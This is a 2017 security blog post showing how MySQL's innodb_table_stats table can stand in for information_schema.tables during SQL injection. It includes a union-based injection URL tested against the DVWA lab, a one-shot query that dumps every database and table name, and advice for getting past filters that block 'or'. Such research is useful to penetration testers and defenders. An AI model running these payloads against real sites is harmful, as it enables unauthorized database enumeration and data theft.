---
author: heh3.org
comments: true
date: 2017-02-16 05:48:27+00:00
layout: post
link: http://heh3.org/?p=20
slug: alternative-for-information_schema-tables-in-mysql
title: Alternative for Information_Schema.Tables in MySQL
wordpress_id: 20
categories:
- websec
---

# Overview


Starting from MySQL 5.5 and above the default storage engine was known as the InnoDB. In MySQL versions 5.5 and above if you do a “select @@innodb_version” you can see the version of the InnoDB, which is almost same as your MySQL version.
![](https://osandamalith.files.wordpress.com/2017/01/innodb-version.png)

But in MySQL 5.6 and above I noticed 2 new tables by InnoDB. “innodb_index_stats” and “innodb_table_stats”. Both these tables contains the database and table names of all the newly created databases and tables.
The MySQL documentation explains these two tables as follows.


<blockquote>The persistent statistics feature relies on the internally managed tables in the mysql database, named innodb_table_stats and innodb_index_stats. These tables are set up automatically in all install, upgrade, and build-from-source procedures.</blockquote>


For injection purposes let’s take the “innodb_table_stats” table. Unfortunately InnoDB doesn’t store columns.

If you simply do “show tables in mysql” you can view this from your localhost.

![](https://osandamalith.files.wordpress.com/2017/01/tables.png)

If we have a look at the table we can see that we can use this as an alternative for “information_schema.tables”.

    
    <code>select * from mysql.innodb_table_stats;
    </code>


![](https://osandamalith.files.wordpress.com/2017/01/selectall.png?w=600&h=147)


## Injections



    
    <code>select table_name from mysql.innodb_table_stats where database_name=schema();
    </code>


Example using DVWA

    
    <code>http://localhost/dvwa/vulnerabilities/sqli/?id=1' union select 1,group_concat(table_name) from mysql.innodb_table_stats where database_name=schema()%23&Submit=Submit%23
    </code>


![](https://osandamalith.files.wordpress.com/2017/01/dvwa1.png?w=600&h=352)


## Dump in One Shot


Here’s the DIOS query which I made to dump all tables from all databases. You can modify this query to suit your needs. When injecting you may have to URL encode.

    
    <code>concat(0x404f73616e64614d616c6974680a, @@innodb_version ,0x0a,user(),0x0a, schema(), (select (@x) from (select (@x:=0x00), (@number:=0),(select (0) from (mysql.innodb_table_stats) where (@x:=concat(@x,0x0a,lpad(@number:=@number+1,2,0),0x2e20,database_name, 0x202d3e20 ,table_name,0x202d3e20 ,length(table_name)))))x))
    </code>


![](https://osandamalith.files.wordpress.com/2017/01/dios.png?w=600&h=436)

    
    <code>@OsandaMalith
    5.6.34
    root@localhost
    dvwa
    01. dvwa -> guestbook -> 9
    02. dvwa -> users -> 5
    03. mysql -> npn -> 3
    04. security -> emails -> 6
    05. security -> referers -> 8
    06. security -> uagents -> 7
    07. security -> users -> 5
    </code>




## Conclusion


In real world scenarios I’ve came across websites where ‘\or\i’ is being filtered. In these cases we cannot use the word ‘information’ since it contains the word ‘or’. If the InnoDB version is 5.6 or above and the current user can access the ‘mysql’ database then we can use this method to extract the tables names. The same can be applied to MariaDB as well.


## Paper


[https://packetstormsecurity.com/files/140831/Alternative-For-Information_Schema.Tables-In-MySQL.html](https://packetstormsecurity.com/files/140831/Alternative-For-Information_Schema.Tables-In-MySQL.html)
[https://www.exploit-db.com/docs/41274.pdf](https://www.exploit-db.com/docs/41274.pdf)

SQLi is often a cancerous topic, if you plan to copy or share please give credits to the author.
